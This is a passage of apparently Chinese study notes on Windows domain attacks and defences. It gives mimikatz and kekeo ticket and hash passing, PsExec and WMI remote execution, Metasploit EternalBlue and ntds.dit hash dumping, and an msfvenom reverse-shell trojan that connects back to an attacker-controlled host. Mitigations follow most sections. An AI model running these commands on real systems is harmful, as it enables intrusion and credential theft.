<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::pth /user:administrator /domain:shiyan.test001 /aes256:2781fl42dxxxx</span></span><br></pre></td></tr></table></figure>

<h2 id="4）票据传递攻击分析与防范"><a href="#4）票据传递攻击分析与防范" class="headerlink" title="4）票据传递攻击分析与防范"></a>4）票据传递攻击分析与防范</h2><p>票据传递(Pass the Ticket, PTT)：基于kerberos协议，不需要本地管理员权限进行横向提权的方式。 </p>
<blockquote>
<p>票据与哈希的区别：哈希是存储在本地的密码文件，票据是用户发起域内主机登录请求后，密钥管理服务器KDC发送给用户主机的凭证文件，在服务器也有一份对应的凭证，以此实现用户认证（即Kerberos协议的实现方式）。</p>
</blockquote>
<p>优点：哈希传递需要<em>本地管理员权限</em>，而票据传递不需要 </p>
<p>流程：</p>
<ol>
<li>导出票据 </li>
<li>清空内存中当前的票据 </li>
<li>将票据注入内存</li>
</ol>
<h3 id="使用mimikatz进行票据传递"><a href="#使用mimikatz进行票据传递" class="headerlink" title="使用mimikatz进行票据传递"></a>使用mimikatz进行票据传递</h3><p>将内存中的票据导出：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::tickets /export&quot;</span> </span><br></pre></td></tr></table></figure>

<p>清除内存中的票据：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge </span><br></pre></td></tr></table></figure>

<p>将票据注入内存：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="string">&quot;kerberos::ptt &lt;票据文件名&gt;&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="使用kekeo进行票据传递"><a href="#使用kekeo进行票据传递" class="headerlink" title="使用kekeo进行票据传递"></a>使用kekeo进行票据传递</h3><p>kekeo不通过导出得到票据文件，而是通过<em>用户名，域名，散列值</em>生成一个。</p>
<p>在目标机器运行kekeo，生成票据文件：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo <span class="string">&quot;tgt::ask /user:administrator /domain:pentest.com /ntlm:D9F9553F143473F54939F5E7E2676128&quot;</span></span><br></pre></td></tr></table></figure>

<p>参数：”tgt::ask &#x2F;user:&lt;用户名&gt; &#x2F;domain:&lt;域名&gt; &#x2F;ntlm:&lt;散列值&gt;”</p>
<p>之后步骤与上面的相同：</p>
<p>清除当前内存中的其他票据：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用kekeo中运行命令</span></span><br><span class="line">kerberos::purge</span><br><span class="line"><span class="comment"># 也可以直接在命令行</span></span><br><span class="line">klist purge</span><br></pre></td></tr></table></figure>

<p>将票据文件导入内存:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt &lt;kirbi票据文件&gt;</span><br></pre></td></tr></table></figure>

<h3 id="防范-1"><a href="#防范-1" class="headerlink" title="防范"></a>防范</h3><ul>
<li>使用短生命周期票据</li>
<li>使用双向验证</li>
<li>定期更新票据处理逻辑</li>
</ul>
<h2 id="5）PsExec和WMI的使用"><a href="#5）PsExec和WMI的使用" class="headerlink" title="5）PsExec和WMI的使用"></a>5）PsExec和WMI的使用</h2><h3 id="Psexec"><a href="#Psexec" class="headerlink" title="Psexec"></a>Psexec</h3><p>PsExec是<a target="_blank" rel="noopener" href="https://download.sysinternals.com/files/PSTools.zip">PsTools工具包</a>中用于批量Windows主机运维的工具，可以通过命令行与目标主机连接，且是微软官方工具，不容易被杀毒软件检测到。</p>
<p>通过PsExec,可以在远程计算机上<strong>执行命令</strong>，也可以将管理员权限提升到System权限以运行指定的程序。</p>
<blockquote>
<p>PsExec的基本原理是：</p>
<ol>
<li>通过<strong>管道</strong>在远程目标机器上创建一个psexec服务</li>
<li>在本地磁盘中生成一个名为“PSEXESVC”的二进制文件</li>
<li>通过psexec服务<strong>运行命令</strong>，运行结束后<strong>删除服务</strong>。</li>
</ol>
</blockquote>
<p>使用：</p>
<p>首先需要建立IPC$:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.1.1\ipc$ <span class="string">&quot;Aa2012admin&quot;</span> /user:administrator</span><br></pre></td></tr></table></figure>

<p>然后获取<strong>System权限</strong>的Shell：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe -accepteula \\192.168.1.1 -s cmd.exe </span><br></pre></td></tr></table></figure>

<p>■ -accepteula：第一次运行PsExec会弹出确认框，使用该参数就不会弹出确认框。</p>
<p>■ -s：以System权限运行远程进程，获得一个System权限的交互式 Shell。如果不使用该参数，会获得一个Administrator权限的Shell。</p>
<p>缺点：使用PsExec会产生大量日志，容易被溯源。</p>
<p>msf中也有psexec模块（<code>exploit/windows/smb/psexec</code>），可用于自动提取获取System权限的shell。</p>
<h3 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h3><p>WMI的全名为“Windows Management Instrumentation”。</p>
<p>WMI是由一系列工具集组成的，可以在本地或者远程管理计算机系统。</p>
<p>优势：在使用wmiexec进行横向移动时，Windows操作系统<strong>默认不会</strong>将WMI的操作记录在日志中。</p>
<p>使用：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:192.168.1.1 /user:administrator /password:Aa2012admin process call create <span class="string">&quot;cmd.exe /c ipconfig &gt; c:\ip.txt&quot;</span></span><br></pre></td></tr></table></figure>

<p>此时会在目标系统的cmd.exe执行一条命令，将执行结果保存在C盘的ip.txt文件中，建立ipc$连接后可以用<code>type</code>命令读取执行结果。</p>
<h2 id="6）永恒之蓝漏洞分析与防范"><a href="#6）永恒之蓝漏洞分析与防范" class="headerlink" title="6）永恒之蓝漏洞分析与防范"></a>6）永恒之蓝漏洞分析与防范</h2><p>利用SMB协议开放的445端口实现任意命令执行。</p>
<p>利用msf扫描：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line"><span class="built_in">set</span> 192.168.99.1/24</span><br><span class="line"><span class="built_in">set</span> threads 50</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p>攻击利用：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> rhost 192.168.99.4</span><br><span class="line">exploit</span><br><span class="line">getuid   <span class="comment"># 查看用户ID，system权限</span></span><br><span class="line">shell    <span class="comment"># 切换到shell命令行环境</span></span><br></pre></td></tr></table></figure>

<h3 id="防范手段"><a href="#防范手段" class="headerlink" title="防范手段"></a>防范手段</h3><ul>
<li>禁用SMB1协议，适用于Windows Vista及更高版本的操作系统</li>
<li>打开WindowsUpdate,或者手动安装KB2919355。</li>
<li>使用防火墙阻止445端口的连接，或者使用进&#x2F;岀站规则阻止445端口的连接。</li>
<li>不要随意打开陌生的文件。</li>
<li>安装杀毒软件，及时进行更新病毒库。</li>
</ul>
<h2 id="7）smbexec-DCOM和SPN的使用"><a href="#7）smbexec-DCOM和SPN的使用" class="headerlink" title="7）smbexec, DCOM和SPN的使用"></a>7）smbexec, DCOM和SPN的使用</h2><h3 id="smbexec"><a href="#smbexec" class="headerlink" title="smbexec"></a>smbexec</h3><p>smbexec可以通过文件共享(admin$, c$, ipc$, d$…)在远程系统中执行命令。</p>
<p>可以实现Linux跨Windows远程执行命令。</p>
<h3 id="DCOM在远程系统中的使用"><a href="#DCOM在远程系统中的使用" class="headerlink" title="DCOM在远程系统中的使用"></a>DCOM在远程系统中的使用</h3><p>DCOM(分布式组件对象模型）是微软的一系列概念和程序接口。</p>
<p>通过DCOM，客户端程序对象能够向网络中的另一台计算机上的服务器程序对象<em>发送请求</em>。</p>
<p>DCOM是基于组件对象模型（COM）的。</p>
<p>COM提供了一套允许在同一台计算机上的客户端和服务器之间进行通信的接口（运行在Windows95及之后版本的操作系统中）。</p>
<h3 id="SPN在域环境中的应用"><a href="#SPN在域环境中的应用" class="headerlink" title="SPN在域环境中的应用"></a>SPN在域环境中的应用</h3><p>SPN：微软给域内的每种资源分配不同的SPN(ServicePrincipalName)，即服务主体名称。 </p>
<p>SPN是服务实例(比如：HTTP、SMB、MySQL等服务)的<em>唯一标识符</em>。</p>
<p>在使用Kerberos协议进行身份验证的网络中，必须在<strong>内置账号</strong>（NetworkService、LocalSystem)或者<strong>用户账号</strong>下为服务器注册SPN。</p>
<p>对于<strong>内置账号</strong>，SPN将<strong>自动</strong>进行注册。但是，如果在<strong>域用户账号</strong>下运行服务，则必须为要使用的账号手动注册SPN。</p>
<h4 id="Kerberos验证"><a href="#Kerberos验证" class="headerlink" title="Kerberos验证"></a>Kerberos验证</h4><p>根据<em>Kerberos</em>协议，当用户输入自己的账号和密码，登录活动目录(AD)时，域控制器会对账号和密码进行验证。</p>
<p>验证通过后，密钥分发中心**(KDC)**会将服务授权的票据(**TGT)**发送给用户（作为用户访问资源时的身份凭据)。</p>
<p>验证过程举例：</p>
<ol>
<li>当用户需要访问MSSQL服务时，系统会以当前用户身份向<strong>域控制器</strong>查询SPN为“MSSQL”的记录。</li>
<li>找到该SPN记录后，用户会再次与KDC通信，将KDC发放的<strong>TGT</strong>作为身份凭据发送给KDC,并将需要访问的SPN发送给KDC</li>
<li>KDC中的身份验证服务*(AS)*对TGT进行解密</li>
<li>确认无误后，由TGS将一张允许访问该SPN所对应的<strong>服务的票据</strong>和该SPN所对应的<strong>服务的地址</strong>发送给用户。</li>
<li>用户使用该票据即可访问MSSQL服务。</li>
</ol>
<p>SPN有两种类型：</p>
<ol>
<li>注册在AD的机器账户(Computers)下</li>
<li>注册在AD的域用户账户(Users)下</li>
</ol>
<h3 id="常用SPN命令"><a href="#常用SPN命令" class="headerlink" title="常用SPN命令"></a>常用SPN命令</h3><p>命令格式：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SPN = serviceclass <span class="string">&quot;/&quot;</span> hostname [<span class="string">&quot;:&quot;</span>port] servicename]</span><br></pre></td></tr></table></figure>

<p>参数：</p>
<ul>
<li>serviceclass：服务组件的名称。标识服务类的字符串，必须</li>
<li>hostname:计算机的FQDN(全限定域名，同时带有计算机名和域名）。必须</li>
<li>port：该服务监听的端口号。可选</li>
<li>servicename：一个字符串，可以是服务的专有名称（DN)、objectGuid、Internet主机名或全限定域名。可选</li>
</ul>
<h4 id="注册SPN"><a href="#注册SPN" class="headerlink" title="注册SPN"></a>注册SPN</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -A &lt;服务组件名称&gt;/&lt;主机名&gt;.&lt;域名&gt;:&lt;端口&gt;</span><br></pre></td></tr></table></figure>

<p>例如：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -A MSSQLSvc/computer1.pentest.com:1433</span><br></pre></td></tr></table></figure>

<ul>
<li>-S:将-A改为-S可以验证是否有重复的spn，跟上面的区别就是，-S可以验证是否有<strong>重复的SPN</strong>，如果有就禁止注册。因为如果有重复的SPN会导致kerberos认证的时候失败。（需要管理员权限）</li>
<li>-D:删除SPN</li>
</ul>
<h4 id="查询SPN"><a href="#查询SPN" class="headerlink" title="查询SPN"></a>查询SPN</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 当前域所有spn:</span></span><br><span class="line">setspn -q */* </span><br><span class="line"><span class="comment"># 指定域spn </span></span><br><span class="line">setspn -T &lt;域名&gt; -q */* </span><br><span class="line"><span class="comment"># 指定域用户/主机的条目 </span></span><br><span class="line">setspn -L &lt;用户名&gt;</span><br></pre></td></tr></table></figure>

<p><em>所有域内的用户都有权限查询SPN</em></p>
<h3 id="SPN扫描"><a href="#SPN扫描" class="headerlink" title="SPN扫描"></a>SPN扫描</h3><p>在活动目录中发现服务的<strong>最佳方法</strong>就是SPN扫描：</p>
<ol>
<li><p>痕迹残留少：SPN扫描不需要通过连接网络中的每个IP地址来检査服务端口，不会因触发内网中的IPS、IDS等设备的规则而产生大量的警告日志”</p>
</li>
<li><p>使用简单：因为每个重要的服务在域中都有对应的SPN,所以，攻击者不必使用复杂的端口扫描技术,只要利用SPN扫描技术就能找到大部分的应用服务器。</p>
</li>
<li><p>权限要求低：因为SPN是通过<strong>LDAP</strong>协议向域控制器进行查询的，所以，攻击者只要获得一个<em>普通的域用户</em>权限，就可以进行SPN扫描。</p>
</li>
</ol>
<blockquote>
<p>LDAP（LightweightDirectory Access Protocol），中文名为轻量目录访问协议。是一种用来查询与更新 AD 的目录服务通信协议。AD 域服务利用 LDAP 命名路径（LDAP naming path）来表示对象在 AD 内的位置，以便用它来访问 AD 内的对象。<br>可以把 LDAP 协议理解为一个关系型数据库，其中存储了域内主机的各种配置信息。</p>
</blockquote>
<p>使用<a target="_blank" rel="noopener" href="https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Discover-PSMSSQLServers">powershell脚本</a>扫描：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 利用SPN发现域中所有的MSSQL服务</span></span><br><span class="line"><span class="built_in">Import-Module</span> .\Discover<span class="literal">-PSMSSQLServers</span>.ps1</span><br><span class="line">Discover<span class="literal">-PSMSSQLServers</span></span><br><span class="line"><span class="comment"># 扫描域中所有SPN信息</span></span><br><span class="line"><span class="built_in">Import-Module</span> .\Discover<span class="literal">-PSInterestingServers</span>.ps1</span><br><span class="line">Discover<span class="literal">-PSInterestingServers</span></span><br></pre></td></tr></table></figure>

<h3 id="Kerberoast攻击分析与防范"><a href="#Kerberoast攻击分析与防范" class="headerlink" title="Kerberoast攻击分析与防范"></a>Kerberoast攻击分析与防范</h3><p>Kerberoast是一种针对Kerberos协议的攻击方式。</p>
<p>在因为需要使用某个特定资源而向TGS发送 <em>Kerberos</em> 服务票据的请求时，用户首先需要使用具有有效身份权限的TGT向TGS请求相应服务的票据。</p>
<p>当TGT被验证有效且具有该服务的权限时，会向用户发送一张票据。该票据使用与SPN相关联的计算机服务账号的NTLM Hash(RC4_HMAC_MD5)。</p>
<p>也就是说，攻击者会通过 Kerberoast 工具尝试使用不同的 NTLM Hash 来打开该Kerberos票据。</p>
<p>如果攻击者使用的NTLM Hash是正确的，Kerberos票据就会被打开，而该NTLM Hash对应于该计算机服务账号的密码。</p>
<p>在域环境中，攻击者会通过Kerberoast使用普通用户权限在活动目录中将计算机服务账号的凭据提取出来。</p>
<h4 id="防范-2"><a href="#防范-2" class="headerlink" title="防范"></a>防范</h4><ul>
<li>保证服务账号密码的长度超过25位； </li>
<li>确保密码的随机性； </li>
<li>定期修改服务账号的密码。 </li>
<li>保证默认的AES256_HMAC加密方式不能改为RC4_HMAC_MD5 </li>
<li>强制使用AES256_HMAC方式对Kerberos票据进行加密</li>
</ul>
<h1 id="第六章-域控制器安全"><a href="#第六章-域控制器安全" class="headerlink" title="第六章 域控制器安全"></a>第六章 域控制器安全</h1><h2 id="使用卷影拷贝服务提取ntds-dit"><a href="#使用卷影拷贝服务提取ntds-dit" class="headerlink" title="使用卷影拷贝服务提取ntds.dit"></a>使用卷影拷贝服务提取ntds.dit</h2><p>活动目录中的所有数据（例如用户密码和散列值等信息）都存储在<strong>C:\Windows\NTDS\ntds.dit</strong>（%SystemRoot%\ntds\ntds.dit）这个文件中。</p>
<p>被系统锁定，即使拥有管理员权限也无法读取这个二进制文件。</p>
<p>但使用Windows本地<strong>卷影拷贝</strong>服务（VSS），就可以获得文件的副本。</p>
<p>提取工具：</p>
<ul>
<li><p>ntdsutil.exe:</p>
<p>  默认安装在域控上，是微软官方为活动目录提供管理机制的工具</p>
<p>  在域控制器的命令行环境中输入如下命令，创建一个快照。该快照包含<em>Windows中的所有文件</em>，且在复制文件时不会受到Windows锁定机制的限制：</p>
  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot <span class="string">&quot;activate instance ntds&quot;</span> create quit quit </span><br></pre></td></tr></table></figure>

<p>  将快照加载到系统中。</p>
  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot <span class="string">&quot;mount &#123;e6b6ea6d-5c76-412e-b405-89834bfe6d7e&#125;&quot;</span> quit quit</span><br></pre></td></tr></table></figure>

<p>  把目标文件复制出来即可：</p>
  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy C:\$SNAP_202105042241_VOLUMEC$\windows\ntds\ntds.dit c:\ntds.dit</span><br></pre></td></tr></table></figure>

<p>  最后把快照卸载并删除：</p>
  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot <span class="string">&quot;unmount &#123;e6b6ea6d-5c76-412e-b405-89834bfe6d7e&#125;&quot;</span> <span class="string">&quot;delete &#123;e6b6ea6d-5c76-412e-b405-89834bfe6d7e&#125;&quot;</span> quit quit </span><br></pre></td></tr></table></figure>
</li>
<li><p>vssadmin</p>
</li>
<li><p>vssown.vbs </p>
</li>
<li><p>ntdsutil的IFM模块</p>
</li>
<li><p>diskshadow</p>
</li>
</ul>
<h3 id="防范方式"><a href="#防范方式" class="headerlink" title="防范方式"></a>防范方式</h3><p>即监控卷影拷贝服务的使用情况：</p>
<ul>
<li>监控卷影拷贝服务及任何涉及活动目录数据库文件（ntds.dit)的可疑操作行为。 </li>
<li>监控System Event ID 7036(卷影拷贝服务进入运行状态的标志）的可疑实例，以及创建进程的事件。 </li>
<li>监控创建diskshadow.exe及相关子进程的事件。 </li>
<li>监控客户端设备中的diskshadow.exe实例创建事件。 </li>
<li>通过日志监控新出现的逻辑驱动器映射事件</li>
</ul>
<h2 id="导出ntds-dit中的散列值"><a href="#导出ntds-dit中的散列值" class="headerlink" title="导出ntds.dit中的散列值"></a>导出ntds.dit中的散列值</h2><p>常用工具：esedbexport、impacket、NTDSDumpex.exe</p>
<h2 id="利用dcsync获取域散列值"><a href="#利用dcsync获取域散列值" class="headerlink" title="利用dcsync获取域散列值"></a>利用dcsync获取域散列值</h2><p>dcsync是mimikatz中的一个功能，作用是利用VSS读取ntds.dit文件以获取域散列值 。</p>
<ul>
<li>需要域管理员权限。</li>
</ul>
<p>导出用户名和散列值：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:shiyan.test001 /all /csv</span><br></pre></td></tr></table></figure>

<p>导出指定用户散列值:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:&lt;域名&gt; /user:&lt;用户名&gt;</span><br></pre></td></tr></table></figure>

<p><em>只能</em>在域控中运行，通过转储lsass.exe进程对散列值进行Dump操作:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先提取</span></span><br><span class="line">privilege::debug</span><br><span class="line"><span class="comment"># 再转储进程</span></span><br><span class="line">lsadump::lsa /inject</span><br></pre></td></tr></table></figure>

<h2 id="使用Metaspolit获取域散列值"><a href="#使用Metaspolit获取域散列值" class="headerlink" title="使用Metaspolit获取域散列值"></a>使用Metaspolit获取域散列值</h2><h3 id="使用psexe-ntdsgrab模块"><a href="#使用psexe-ntdsgrab模块" class="headerlink" title="使用psexe_ntdsgrab模块"></a>使用psexe_ntdsgrab模块</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/admin/smb/psexec_ntdsgrab</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> RHOST 192.168.1.1</span><br><span class="line"><span class="built_in">set</span> SMBDomain shiyan.test001</span><br><span class="line"><span class="built_in">set</span> SMBUser administrator</span><br><span class="line"><span class="built_in">set</span> SMBPass Aa123456</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p>此时将2012的ntds.dit文件和SYSTEM项复制并传送到KaliLinux机器的&#x2F;root&#x2F;.msf4&#x2F;loot&#x2F;文件夹下</p>
<h3 id="利用Metasploit获取域账号和域散列值（含msf如何getShell）"><a href="#利用Metasploit获取域账号和域散列值（含msf如何getShell）" class="headerlink" title="利用Metasploit获取域账号和域散列值（含msf如何getShell）"></a>利用Metasploit获取域账号和域散列值（含msf如何getShell）</h3><p>首先获取Meterpreter shell:</p>
<p>（注意：这部分是如何使用msf在可以执行命令的机器上getshell，与Cobalt Strike类似）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler <span class="comment"># 使用模块</span></span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp <span class="comment"># 设置payload，与木马中-p指定的完全相同</span></span><br><span class="line"><span class="built_in">set</span> lhost &lt;攻击机ip&gt;</span><br><span class="line"><span class="built_in">set</span> lport &lt;攻击机监听端口&gt;</span><br><span class="line">exploit -j -z <span class="comment"># 后台进行监听，等待靶机执行木马程序</span></span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20240611195751222.png" alt="image-20240611195751222"></p>
<p>使用msfvenom生成木马程序：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;反弹的目的IP&gt; LPORT=&lt;反弹的</span><br><span class="line">目的端口&gt; -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>

<blockquote>
<p>参数：</p>
<ul>
<li>-p 指定payload，要与metersploit中设置监听的payload完全一致 </li>
<li>-f指输出文件的格式 </li>
<li>LHOST 与LPORT一般指向攻击机的ip与监听的端口</li>
</ul>
</blockquote>
<p>靶机执行shell.exe木马时，会在msf上看到反弹shell的连接:</p>
<p><img src="/../images/image-20240611195945053.png" alt="image-20240611195945053"></p>
<p>获取到Meterpreter shell之后，再获取域账号和域散列值(需要管理员权限)：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use post/windows/gather/credentials/domain_hashdump</span><br><span class="line"><span class="built_in">set</span> session 1 </span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20240611200048921.png" alt="image-20240611200048921"></p>
<h2 id="使用vshadow-exe和QuarksPwDump-exe导出域账号和域散列值"><a href="#使用vshadow-exe和QuarksPwDump-exe导出域账号和域散列值" class="headerlink" title="使用vshadow.exe和QuarksPwDump.exe导出域账号和域散列值"></a>使用vshadow.exe和QuarksPwDump.exe导出域账号和域散列值</h2><p><a target="_blank" rel="noopener" href="https://github.com/quarkslab/quarkspwdump">QuarksPwDump.exe</a>可以快速安全、全面地读取全部域账号和域散列值。</p>
<h2 id="Kerberos域用户提权漏洞分析与防范"><a href="#Kerberos域用户提权漏洞分析与防范" class="headerlink" title="Kerberos域用户提权漏洞分析与防范"></a>Kerberos域用户提权漏洞分析与防范</h2><p>如果攻击者获取了域内任何一台计算机的Shell权限，同时知道任意域用户的用户名、SID、密码，即可获得域管理员权限，进而控制域控制器，最终获得域权限。</p>
<blockquote>
<p>这个漏洞产生的原因是：用户在向Kerberos密钥分发中心( KDC)申请TGT(由票据授权服务产生的身份凭证）时，可以伪造自己的Kerberos票据。</p>
</blockquote>
<p>如果票据<strong>声明</strong>自己有域管理员权限，而KDC在处理该票据时<strong>未验证票据的签名</strong>，那么，返给用户的TGT就使普通域用户拥有了域管理员权限。</p>
<p>用户可以将TGT发送到KDC，KDC的TGS(票据授权服务)在验证TGT后，将服务票据（ServiceTicket)发送给该用户，而该用户拥有访问该服务的权限，从而使攻击者可以访问域内的资源。</p>
<h3 id="防范建议"><a href="#防范建议" class="headerlink" title="防范建议"></a>防范建议</h3><ul>
<li>开启Windows Update功能，进行自动更新。 </li>
<li>手动下载补丁包进行修复。 </li>
<li>对域内账号进行控制，禁止使用弱口令，及时、定期修改密码。 </li>
<li>在服务器上安装反病毒软件，及时更新病毒库。</li>
</ul>
<h1 id="第七章-跨域攻击分析及防御"><a href="#第七章-跨域攻击分析及防御" class="headerlink" title="第七章 跨域攻击分析及防御"></a>第七章 跨域攻击分析及防御</h1><p>域信任的作用是解决多域环境中的跨域资源共享问题。 </p>
<p>域环境不会无条件地接收来自其他域的凭证，只会接收来自受信任的域的凭证。</p>
<p>常见的跨域攻击方法有：</p>
<ol>
<li>常规渗透方法（例如利用Web漏洞跨域获取权限）；</li>
<li>利用已知域散列值进行哈希传递攻击或票据传递攻击（例如域控制器本地管理员密码可能相同）；</li>
<li>利用域信任关系进行跨域攻击。</li>
</ol>
<h3 id="域信任关系"><a href="#域信任关系" class="headerlink" title="域信任关系"></a>域信任关系</h3><h4 id="单向信任"><a href="#单向信任" class="headerlink" title="单向信任"></a>单向信任</h4><p>单向信任是指在两个域之间创建单向的信任路径，即在一个方向上是信任流，在另一个方向上是访问流。 </p>
<p>例：若A域信任B域，那么B域内受信任的主体可以访问A域内信任B域的资源。但A域内的主体无法 访问B域内的资源</p>
<h4 id="双向信任"><a href="#双向信任" class="headerlink" title="双向信任"></a>双向信任</h4><p>双向信任是指两个单向信任的组合，信任域和受信任域彼此信任，在两个方向上都有信任流和访问流。 </p>
<p>活动目录中的所有域信任关系都是双向可传递的。 </p>
<p>子域与父域也是双向可传递信任的。</p>
<h4 id="外部内部"><a href="#外部内部" class="headerlink" title="外部内部"></a>外部内部</h4><ul>
<li>内部信任：<em>同一域树</em>中的两个或多个域之间的信任关系</li>
</ul>
<p>该信任关系可传递，例如有三个A域的子域：BA、CA、DA，BA域信任CA域，CA域信任DA域，则BA域也信任DA域 </p>
<ul>
<li>外部信任：两个<em>不同林</em>中的域的信任关系。</li>
</ul>
<p>外部信任是不可传递的。 林信任关系可能是不可传递的，也可能是可传递的</p>
<h2 id="防范跨域攻击"><a href="#防范跨域攻击" class="headerlink" title="防范跨域攻击"></a>防范跨域攻击</h2><ul>
<li>放置在内网中的Web应用服务器大多为内部办公使用（或者作为测试服务器使用），所以，其安全性受重视程度较低，往往会使用弱口令或者存在未及时修复的补丁。</li>
<li>攻击者在获取当前域的域控制器的权限后，会检查域控制器的本地管理员密码是否与其他域的域控制器本地管理</li>
<li>密码相同，以及在两个域之间的网络没有被隔离的情况下是否可以通过哈希传递进行横向攻击等。</li>
<li>在很多公司中，虽然为不同的部门划分了不同的域，但域管理员可能是同一批人，因此可能出现域管理员的用户名和密码相同的情况。</li>
<li>在日常网络维护中，需要养成良好的安全习惯，才能有效地防范跨域攻击。</li>
</ul>
<h1 id="第八章-权限维持分析及防御"><a href="#第八章-权限维持分析及防御" class="headerlink" title="第八章 权限维持分析及防御"></a>第八章 权限维持分析及防御</h1><p>后门：通过绕过安全控制措施获取对程序或系统访问权限的方法。 </p>
<p>简单地说，后门就是一个留在目标主机上的木马软件，它可以使攻击者随时与目标主机进行连接。</p>
<p>在大多数情况下，后门是一个运行在目标主机上的<strong>隐藏进程</strong>：</p>
<ul>
<li>因为后门可能允许一个普通的、未经授权的用户控制计算机，所以攻击者经常使用后门来<strong>控制服务器</strong>（比一般的攻击手段更具隐蔽性)。</li>
<li>攻击者在提升权限之后，往往会通过建立后门来<strong>维持</strong>对目标主机的控制权。</li>
<li>这样一来，即使修复了被攻击者利用的系统漏洞，攻击者还是可以通过后门继续控制目标系统。</li>
</ul>
<h2 id="操作系统后门分析与防范"><a href="#操作系统后门分析与防范" class="headerlink" title="操作系统后门分析与防范"></a>操作系统后门分析与防范</h2><p>操作系统后门：绕过目标系统安全控制体系的正规用户认证过程，来维持对目标系统的控制权及隐匿控制行为的方法。</p>
